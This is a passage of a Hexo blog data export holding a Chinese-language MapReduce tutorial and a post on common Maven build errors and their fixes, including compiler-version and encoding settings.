src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/7.png\" alt=\"reduce\"></p>\n","excerpt":"<h3 id=\"MapReduce\"><a href=\"#MapReduce\" class=\"headerlink\" title=\"MapReduce\"></a>MapReduce</h3><p>MapReduce&#x662F;&#x4E00;&#x79CD;&#x7F16;&#x7A0B;&#x6A21;&#x578B;&#xFF0C;&#x7528;&#x4E8E;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x96C6;&#xFF08;&#x5927;&#x4E8E;1TB&#xFF09;&#x7684;&#x5E76;&#x884C;&#x8FD0;&#x7B97;&#x3002;&#x6982;&#x5FF5;&#x201D;Map&#xFF08;&#x6620;&#x5C04;&#xFF09;&#x201D;&#x548C;&#x201D;Reduce&#xFF08;&#x5F52;&#x7EA6;&#xFF09;&#x201D;&#xFF0C;&#x662F;&#x5B83;&#x4EEC;&#x7684;&#x4E3B;&#x8981;&#x601D;&#x60F3;&#xFF0C;&#x90FD;&#x662F;&#x4ECE;&#x51FD;&#x6570;&#x5F0F;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x91CC;&#x501F;&#x6765;&#x7684;&#xFF0C;&#x8FD8;&#x6709;&#x4ECE;&#x77E2;&#x91CF;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x91CC;&#x501F;&#x6765;&#x7684;&#x7279;&#x6027;&#x3002;<strong>&#x5B83;&#x6781;&#x5927;&#x5730;&#x65B9;&#x4FBF;&#x4E86;&#x7F16;&#x7A0B;&#x4EBA;&#x5458;&#x5728;&#x4E0D;&#x4F1A;&#x5206;&#x5E03;&#x5F0F;&#x5E76;&#x884C;&#x7F16;&#x7A0B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5C06;&#x81EA;&#x5DF1;&#x7684;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E0A;&#x3002;</strong></p>\n<h3 id=\"&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\"><a href=\"#&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\" class=\"headerlink\" title=\"&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;\"></a>&#x5206;&#x6790;MapReduce&#x6267;&#x884C;&#x8FC7;&#x7A0B;</h3><p>MapReduce&#x8FD0;&#x884C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;Mapper&#x8FD0;&#x884C;&#x7684;&#x4EFB;&#x52A1;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5904;&#x7406;&#x6570;&#x636E;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x3002;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x8F93;&#x51FA;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F5C;&#x4E3A;&#x81EA;&#x5DF1;&#x7684;&#x8F93;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x8C03;&#x7528;&#x81EA;&#x5DF1;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x5230;HDFS&#x7684;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x5982;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/1.png\" alt=\"\"></p>\n<hr>\n<h3 id=\"Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"><a href=\"#Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"></a>Mapper&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;</h3><p><strong>&#x6BCF;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;</strong>&#xFF0C;&#x5B83;&#x4F1A;&#x8BFB;&#x53D6;HDFS&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x89E3;&#x6790;&#x6210;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x7ECF;&#x8FC7;&#x6211;&#x4EEC;&#x8986;&#x76D6;&#x7684;map&#x65B9;&#x6CD5;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x8F6C;&#x6362;&#x4E3A;&#x5F88;&#x591A;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x518D;&#x8F93;&#x51FA;&#x3002;&#x6574;&#x4E2A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002;</p>","more":"<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/2.png\" alt=\"\"></p>\n<p>&#x5728;&#x4E0A;&#x56FE;&#x4E2D;&#xFF0C;&#x628A;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x5206;&#x4E3A;&#x516D;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<ul>\n<li><p>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x6807;&#x51C6;&#x8FDB;&#x884C;&#x5206;&#x7247;(InputSplit)&#xFF0C;&#x6BCF;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#x3002;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8F93;&#x5165;&#x7247;(InputSplit)&#x7684;&#x5927;&#x5C0F;&#x4E0E;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002;&#x5982;&#x679C;&#x6570;&#x636E;&#x5757;(Block)&#x7684;&#x5927;&#x5C0F;&#x662F;&#x9ED8;&#x8BA4;&#x503C;64MB&#xFF0C;&#x8F93;&#x5165;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;32MB&#xFF0C;&#x4E00;&#x4E2A;&#x662F;72MB&#x3002;&#x90A3;&#x4E48;&#x5C0F;&#x7684;&#x6587;&#x4EF6;&#x662F;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F1A;&#x5206;&#x4E3A;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5757;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E24;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;&#x4E00;&#x5171;&#x4EA7;&#x751F;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x3002;<strong>&#x6BCF;&#x4E00;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#x7531;&#x4E00;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;</strong>&#x3002;&#x8FD9;&#x91CC;&#x7684;&#x4E09;&#x4E2A;&#x8F93;&#x5165;&#x7247;&#xFF0C;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;Mapper&#x8FDB;&#x7A0B;&#x5904;&#x7406;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x8F93;&#x5165;&#x7247;&#x4E2D;&#x7684;&#x8BB0;&#x5F55;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6709;&#x4E2A;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x662F;&#x628A;&#x6BCF;&#x4E00;&#x884C;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x6210;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x201C;&#x952E;&#x201D;&#x662F;&#x6BCF;&#x4E00;&#x884C;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;(&#x5355;&#x4F4D;&#x662F;&#x5B57;&#x8282;)&#xFF0C;&#x201C;&#x503C;&#x201D;&#x662F;&#x672C;&#x884C;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x8C03;&#x7528;Mapper&#x7C7B;&#x4E2D;&#x7684;map&#x65B9;&#x6CD5;&#x3002;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x4E2D;&#x89E3;&#x6790;&#x51FA;&#x6765;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x8C03;&#x7528;&#x4E00;&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x5982;&#x679C;&#x6709;1000&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;1000&#x6B21;map&#x65B9;&#x6CD5;&#x3002;&#x6BCF;&#x4E00;&#x6B21;&#x8C03;&#x7528;map&#x65B9;&#x6CD5;&#x4F1A;&#x8F93;&#x51FA;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x56DB;&#x9636;&#x6BB5;&#x662F;&#x6309;&#x7167;&#x4E00;&#x5B9A;&#x7684;&#x89C4;&#x5219;&#x5BF9;&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x5206;&#x533A;&#x3002;&#x6BD4;&#x8F83;&#x662F;&#x57FA;&#x4E8E;&#x952E;&#x8FDB;&#x884C;&#x7684;&#x3002;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x7684;&#x952E;&#x8868;&#x793A;&#x7701;&#x4EFD;(&#x5982;&#x5317;&#x4EAC;&#x3001;&#x4E0A;&#x6D77;&#x3001;&#x5C71;&#x4E1C;&#x7B49;)&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x6309;&#x7167;&#x4E0D;&#x540C;&#x7701;&#x4EFD;&#x8FDB;&#x884C;&#x5206;&#x533A;&#xFF0C;&#x540C;&#x4E00;&#x4E2A;&#x7701;&#x4EFD;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5212;&#x5206;&#x5230;&#x4E00;&#x4E2A;&#x533A;&#x4E2D;&#x3002;<strong>&#x9ED8;&#x8BA4;&#x662F;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x533A;&#x3002;&#x5206;&#x533A;&#x7684;&#x6570;&#x91CF;&#x5C31;&#x662F;Reducer&#x4EFB;&#x52A1;&#x8FD0;&#x884C;&#x7684;&#x6570;&#x91CF;&#x3002;&#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E00;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x3002;</strong></p>\n</li>\n<li><p>&#x7B2C;&#x4E94;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6BCF;&#x4E2A;&#x5206;&#x533A;&#x4E2D;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x9996;&#x5148;&#xFF0C;&#x6309;&#x7167;&#x952E;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x5BF9;&#x4E8E;&#x952E;&#x76F8;&#x540C;&#x7684;&#x952E;&#x503C;&#x5BF9;&#xFF0C;&#x6309;&#x7167;&#x503C;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x6BD4;&#x5982;&#x4E09;&#x4E2A;&#x952E;&#x503C;&#x5BF9;<2,2>&#x3001;<1,3>&#x3001;<2,1>&#xFF0C;&#x952E;&#x548C;&#x503C;&#x5206;&#x522B;&#x662F;&#x6574;&#x6570;&#x3002;&#x90A3;&#x4E48;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x662F;<1,3>&#x3001;<2,1>&#x3001;<2,2>&#x3002;&#x5982;&#x679C;&#x6709;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF0C;&#x90A3;&#x4E48;&#x8FDB;&#x5165;&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#xFF1B;&#x5982;&#x679C;&#x6CA1;&#x6709;&#xFF0C;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linux&#x6587;&#x4EF6;&#x4E2D;&#x3002;</2,2></2,1></1,3></2,1></1,3></2,2></p>\n</li>\n<li><p>&#x7B2C;&#x516D;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;reduce&#x5904;&#x7406;&#x3002;<strong>&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x4F1A;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;&#x3002;</strong>&#x7ECF;&#x8FC7;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x4F1A;&#x51CF;&#x5C11;&#x3002;&#x5F52;&#x7EA6;&#x540E;&#x7684;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x5230;&#x672C;&#x5730;&#x7684;linxu&#x6587;&#x4EF6;&#x4E2D;&#x3002;<strong>&#x672C;&#x9636;&#x6BB5;&#x9ED8;&#x8BA4;&#x662F;&#x6CA1;&#x6709;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x81EA;&#x5DF1;&#x589E;&#x52A0;&#x8FD9;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x4EE3;&#x7801;&#x3002;</strong></p>\n</li>\n</ul>\n<hr>\n<h3 id=\"Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"><a href=\"#Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\" class=\"headerlink\" title=\"Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;\"></a>Reducer&#x4EFB;&#x52A1;&#x8BE6;&#x89E3;</h3><p>&#x6BCF;&#x4E2A;Reducer&#x4EFB;&#x52A1;&#x662F;&#x4E00;&#x4E2A;java&#x8FDB;&#x7A0B;&#x3002;Reducer&#x4EFB;&#x52A1;&#x63A5;&#x6536;Mapper&#x4EFB;&#x52A1;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5F52;&#x7EA6;&#x5904;&#x7406;&#x540E;&#x5199;&#x5165;&#x5230;HDFS&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#x7684;&#x51E0;&#x4E2A;&#x9636;&#x6BB5;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/3.png\" alt=\"\"></p>\n<ul>\n<li><p>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x662F;Reducer&#x4EFB;&#x52A1;&#x4F1A;&#x4E3B;&#x52A8;&#x4ECE;Mapper&#x4EFB;&#x52A1;&#x590D;&#x5236;&#x5176;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x3002;Mapper&#x4EFB;&#x52A1;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x56E0;&#x6B64;Reducer&#x4F1A;&#x590D;&#x5236;&#x591A;&#x4E2A;Mapper&#x7684;&#x8F93;&#x51FA;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x662F;&#x628A;&#x590D;&#x5236;&#x5230;Reducer&#x672C;&#x5730;&#x6570;&#x636E;&#xFF0C;&#x5168;&#x90E8;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x5373;&#x628A;&#x5206;&#x6563;&#x7684;&#x6570;&#x636E;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x6570;&#x636E;&#x3002;&#x518D;&#x5BF9;&#x5408;&#x5E76;&#x540E;&#x7684;&#x6570;&#x636E;&#x6392;&#x5E8F;&#x3002;</p>\n</li>\n<li><p>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#x662F;&#x5BF9;&#x6392;&#x5E8F;&#x540E;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;reduce&#x65B9;&#x6CD5;&#x3002;<strong>&#x952E;&#x76F8;&#x7B49;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x8C03;&#x7528;&#x4E00;&#x6B21;reduce&#x65B9;&#x6CD5;</strong>&#xFF0C;&#x6BCF;&#x6B21;&#x8C03;&#x7528;&#x4F1A;&#x4EA7;&#x751F;&#x96F6;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x952E;&#x503C;&#x5BF9;&#x3002;&#x6700;&#x540E;&#x628A;&#x8FD9;&#x4E9B;&#x8F93;&#x51FA;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x5199;&#x5165;&#x5230;HDFS&#x6587;&#x4EF6;&#x4E2D;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<h3 id=\"Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\"><a href=\"#Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\" class=\"headerlink\" title=\"Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;\"></a>Shuffle&#x2014;&#x2014;MapReduce&#x6838;&#x5FC3;</h3><p><strong>Shuffle&#x8FC7;&#x7A0B;&#x662F;MapReduce&#x7684;&#x6838;&#x5FC3;&#xFF0C;&#x4E5F;&#x88AB;&#x79F0;&#x4E3A;&#x5947;&#x8FF9;&#x53D1;&#x751F;&#x7684;&#x5730;&#x65B9;&#x3002;</strong><br>Shuffle&#x8FC7;&#x7A0B;&#xFF1A;&#x5C06;map&#x7684;&#x8F93;&#x51FA;&#x4F5C;&#x4E3A;reduce&#x7684;&#x8F93;&#x5165;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x8FD9;&#x4E9B;&#x6587;&#x7AE0;&#x53EF;&#x80FD;&#x5BF9;&#x5927;&#x5BB6;&#x6709;&#x6240;&#x5E2E;&#x52A9;&#xFF1A;<br><a href=\"http://my.oschina.net/u/2003855/blog/310301\">http://my.oschina.net/u/2003855/blog/310301</a><br><a href=\"http://blog.csdn.net/thomas0yang/article/details/8562910\">http://blog.csdn.net/thomas0yang/article/details/8562910</a></p>\n<hr>\n<h3 id=\"WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\"><a href=\"#WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\" class=\"headerlink\" title=\"WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;\"></a>WordCount&#x5355;&#x8BCD;&#x8BA1;&#x6570;</h3><p>&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x662F;&#x6700;&#x7B80;&#x5355;&#x4E5F;&#x662F;&#x6700;&#x80FD;&#x4F53;&#x73B0;MapReduce&#x601D;&#x60F3;&#x7684;&#x7A0B;&#x5E8F;&#x4E4B;&#x4E00;&#xFF0C;&#x53EF;&#x4EE5;&#x79F0;&#x4E3A;MapReduce&#x7248;&#x201D;Hello World&#x201D;&#x3002;<br>&#x5355;&#x8BCD;&#x8BA1;&#x6570;&#x4E3B;&#x8981;&#x5B8C;&#x6210;&#x529F;&#x80FD;&#x662F;&#xFF1A;&#x7EDF;&#x8BA1;&#x4E00;&#x7CFB;&#x5217;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x8BCD;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002;<br><strong>&#x4EE5;&#x4E0B;&#x662F;&#x76F8;&#x5173;&#x56FE;&#x89E3;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED3;&#x5408;&#x4E0A;&#x6587;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x8FDB;&#x884C;&#x7406;&#x89E3;&#x3002;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/4.png\" alt=\"&#x5206;&#x7247;&#x540E;&#x89E3;&#x6790;&#x4E3A;&#x952E;&#x503C;&#x5BF9;\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/5.png\" alt=\"map\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/6.png\" alt=\"&#x5206;&#x533A;&#x6392;&#x5E8F;&#x5408;&#x5E76;\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/7.png\" alt=\"reduce\"></p>"},{"title":"Maven常见问题汇总","date":"2016-05-20T14:22:00.000Z","toc":false,"_content":"\n_最近使用maven过程中，遇到一些问题，记录如下，方便日后查询所用_\n\n**问题1：执行package命令报错,提示source-1.5不支持diamond运算符，建议换成1.7**\n**原因：**编译版本出了问题，在pom.xml相应位置添加1.7或1.7以上的source和target即可\n```bash\n<plugins> \n  <plugin> \n    <groupId>org.apache.maven.plugins</groupId> \n\t<artifactId>maven-compiler-plugin</artifactId> \n\t<configuration> \n\t  <source>1.7</source> \n\t  <target>1.7</target> \n\t</configuration> \n  </plugin> \n</plugins>\n```\n\n* * *\n\n**问题2：执行package命令报错，提示编码GBK的不可映射字符**\n**原因：**字符编码错误，在问题1的target代码下增加下面一行即可\n```bash\n<encoding>utf8</encoding>\n```\n<!-- more -->\n* * *\n\n**问题3：执行package命令报错，某个xml文件提示如下错误**\n```bash\nnested exception is com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException: Invalid byte 2 of 3-byte UTF-8 sequence \n```\n**原因：**xml文件中声明的编码与xml文件本身保存时的编码不一致。比如你的声明是UTF-8，但是却以ANSI格式编码保存。尽管文件没有出现乱码，但xml解析器仍无法解析。有些人建议把xml改为GBK，这并不可取。解决方法为：用记事本打开xml文件，重新save。\n\n* * *\n\n**问题4：将svn的maven项目checkout至Eclipse，有时报如下错误**\n```bash\njava.lang.NoClassDefFoundError: Lorg/apache/log4j/Logger错误\n```\n**原因：**maven install生成的jar包没有自动引入，按下图配置即可\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Maven%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1.jpg)\n\n","source":"_posts/Maven常见问题汇总.md","raw":"---\ntitle: Maven常见问题汇总\ntags:\n  - Maven\ncategories:\n  - 错误集锦\ndate: 2016-5-20 22:22:00\ntoc: false\n\n---\n\n_最近使用maven过程中，遇到一些问题，记录如下，方便日后查询所用_\n\n**问题1：执行package命令报错,提示source-1.5不支持diamond运算符，建议换成1.7**\n**原因：**编译版本出了问题，在pom.xml相应位置添加1.7或1.7以上的source和target即可\n```bash\n<plugins> \n  <plugin> \n    <groupId>org.apache.maven.plugins</groupId> \n\t<artifactId>maven-compiler-plugin</artifactId> \n\t<configuration> \n\t  <source>1.7</source> \n\t  <target>1.7</target> \n\t</configuration> \n  </plugin> \n</plugins>\n```\n\n* * *\n\n**问题2：执行package命令报错，提示编码GBK的不可映射字符**\n**原因：**字符编码错误，在问题1的target代码下增加下面一行即可\n```bash\n<encoding>utf8</encoding>\n```\n<!-- more -->\n* * *\n\n**问题3：执行package命令报错，某个xml文件提示如下错误**\n```bash\nnested exception is com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException: Invalid byte 2 of 3-byte UTF-8 sequence \n```\n**原因：**xml文件中声明的编码与xml文件本身保存时的编码不一致。比如你的声明是UTF-8，但是却以ANSI格式编码保存。尽管文件没有出现乱码，但xml解析器仍无法解析。有些人建议把xml改为GBK，这并不可取。解决方法为：用记事本打开xml文件，重新save。\n\n* * *\n\n**问题4：将svn的maven项目checkout至Eclipse，有时报如下错误**\n```bash\njava.lang.NoClassDefFoundError: Lorg/apache/log4j/Logger错误\n```\n**原因：**maven install生成的jar包没有自动引入，按下图配置即可\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Maven%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1.jpg)\n\n","slug":"Maven常见问题汇总","published":1,"updated":"2016-11-17T11:59:42.665Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbb0016gwtmci33yz9q","content":"<p><em>&#x6700;&#x8FD1;&#x4F7F;&#x7528;maven&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8BB0;&#x5F55;&#x5982;&#x4E0B;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x67E5;&#x8BE2;&#x6240;&#x7528;</em></p>\n<p><strong>&#x95EE;&#x9898;1&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;,&#x63D0;&#x793A;source-1.5&#x4E0D;&#x652F;&#x6301;diamond&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5EFA;&#x8BAE;&#x6362;&#x6210;1.7</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x7F16;&#x8BD1;&#x7248;&#x672C;&#x51FA;&#x4E86;&#x95EE;&#x9898;&#xFF0C;&#x5728;pom.xml&#x76F8;&#x5E94;&#x4F4D;&#x7F6E;&#x6DFB;&#x52A0;1.7&#x6216;1.7&#x4EE5;&#x4E0A;&#x7684;source&#x548C;target&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugins&gt; </span><br><span class=\"line\">  &lt;plugin&gt; </span><br><span class=\"line\">    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; </span><br><span class=\"line\">\t&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; </span><br><span class=\"line\">\t&lt;configuration&gt; </span><br><span class=\"line\">\t  &lt;<span class=\"built_in\">source</span>&gt;1.7&lt;/<span class=\"built_in\">source</span>&gt; </span><br><span class=\"line\">\t  &lt;target&gt;1.7&lt;/target&gt; </span><br><span class=\"line\">\t&lt;/configuration&gt; </span><br><span class=\"line\">  &lt;/plugin&gt; </span><br><span class=\"line\">&lt;/plugins&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p><strong>&#x95EE;&#x9898;2&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x63D0;&#x793A;&#x7F16;&#x7801;GBK&#x7684;&#x4E0D;&#x53EF;&#x6620;&#x5C04;&#x5B57;&#x7B26;</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x95EE;&#x9898;1&#x7684;target&#x4EE3;&#x7801;&#x4E0B;&#x589E;&#x52A0;&#x4E0B;&#x9762;&#x4E00;&#x884C;&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;encoding&gt;utf8&lt;/encoding&gt;</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<hr>\n<p><strong>&#x95EE;&#x9898;3&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x67D0;&#x4E2A;xml&#x6587;&#x4EF6;&#x63D0;&#x793A;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span 